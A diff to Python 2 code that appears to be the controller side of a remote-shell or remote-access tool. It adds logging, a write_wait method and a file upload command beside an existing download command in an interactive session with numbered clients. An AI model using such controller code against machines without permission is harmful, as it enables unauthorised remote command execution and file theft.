@@ -132,6 +132,10 @@ class Channel:
 		logging.debug("Data written into channel #"+str(ord(self.id))+" output: "+data.strip())
 		self.output_queue.put(self.id+data)
 		
+	def write_wait(self, data):
+		self.output_queue.put(self.id+data)
+		while not self.output_queue.empty(): time.sleep(1)
+		
 	def __repr__(self):
 		print "Channel ID: "+str(ord(self.id))
 	
@@ -255,7 +259,7 @@ class Client:
 		return self.transport.signal(data)
 		
 	def download(self, path):
-		logging.info("starting download.")
+		logging.info("Starting download of file: "+path)
 		ch = self.transport.create_channel()
 		time.sleep(1)
 		self.transport.signal("DOWNLOAD_FILE:"+ch.id+":"+path)
@@ -264,8 +268,10 @@ class Client:
 			print INFO + "Starting download..."
 			data = ch.read_input()
 			if data.startswith("Error:"):
+				logging.error("Could not download file: "+data)
 				print BAD + data
 			elif data == chr(255):
+				logging.info("File is empty.")
 				print INFO + "File is empty."
 			else:
 				f.write(data)
@@ -273,8 +279,29 @@ class Client:
 					data = ch.read_input()
 					if data == chr(255): break
 					f.write(data)
+				logging.info("Download complete.")
 				print GOOD + "Download complete!"
-	
+				
+	def upload(self, path):
+		logging.info("Starting upload of file: "+path)
+		if not os.path.isfile(path):
+			print BAD+"No such file: "+path
+			return
+			
+		ch = self.transport.create_channel()
+		time.sleep(1)
+		self.transport.signal("UPLOAD_FILE:"+ch.id+":"+path)
+
+		with open(path, "rb") as f:
+			while True:
+				data = f.read(8192)
+				if not data: break
+				ch.write_output(data)
+				time.sleep(0.1)
+		time.sleep(2)
+		ch.write_output(chr(255)*50)
+		time.sleep(5)
+
 	def interact(self):
 		logging.info("Starting interaction with client #"+str(self.id))
 		self.send("cd .")
@@ -302,6 +329,10 @@ class Client:
 			if user_input.startswith("download"):
 				#self.send(user_input)
 				self.download(user_input.split()[1])
+				user_input = "cd ."
+				
+			if user_input.startswith("upload"):
+				self.upload(user_input.split()[1])
 				user_input = "cd ."
 
 			self.send(user_input)
